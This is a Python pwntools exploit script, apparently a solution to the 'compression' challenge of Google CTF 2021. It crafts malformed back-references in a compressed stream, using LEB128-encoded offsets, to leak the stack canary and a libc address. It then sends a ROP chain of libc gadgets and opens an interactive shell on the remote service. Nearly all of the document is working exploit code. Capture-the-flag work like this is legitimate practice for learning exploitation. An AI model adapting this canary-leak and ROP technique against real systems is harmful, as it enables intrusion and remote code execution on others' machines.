from pwn import *

HOST, PORT = '0.0.0.0', 31338
HOST, PORT = 'compression.2021.ctfcompetition.com 1337'.split(' ')
r = remote(HOST, PORT)


def leb128(value):
    res = []
    value &= (2 ** 64 - 1)
    while value >= 0x80:
        res.append((value & 0x7f) | 0x80)
        value >>= 7
    assert value < 0x80
    res.append(value)
    print(res)
    return bytes(res)


def _(cnt, off):
    return b'\xff' + leb128(off) + leb128(cnt)


# time.sleep(2)
r.sendline('2')
r.sendline(flat(
    'TINY',
    # collect canary, gadgets
    _(8, -0x1008),
    b'\xac',
    _(7, -0x1030),
    _(0x1000 - 8, 8),
    _(8, 0x1008),
    _(0x28, 0x1010),
    _(8, 0x1030),
    _(0, 0)
).hex())
r.recvuntil('to:')
r.recvline()
res = bytes.fromhex(r.recvline().decode())
libc = u64(res[8:16])-0x270ac
canary = u64(res[0:8])
r.sendline('2')
r.sendline(flat(
    'TINY',
    p64(canary),
    p64(libc+0x26b73),
    p64(libc+0x26b72),
    p64(libc+0x1b75aa),
    p64(libc+0x55410),
    _(0x1000 - 32, 8),
    _(8, 0x1008),
    _(0x28, 0x1010),
    _(0x20, 0x1030),
    _(0, 0)
    ).hex())
r.recvuntil('to:')
r.recvline()
res = bytes.fromhex(r.recvline().decode())
print(hexdump(res))
r.interactive()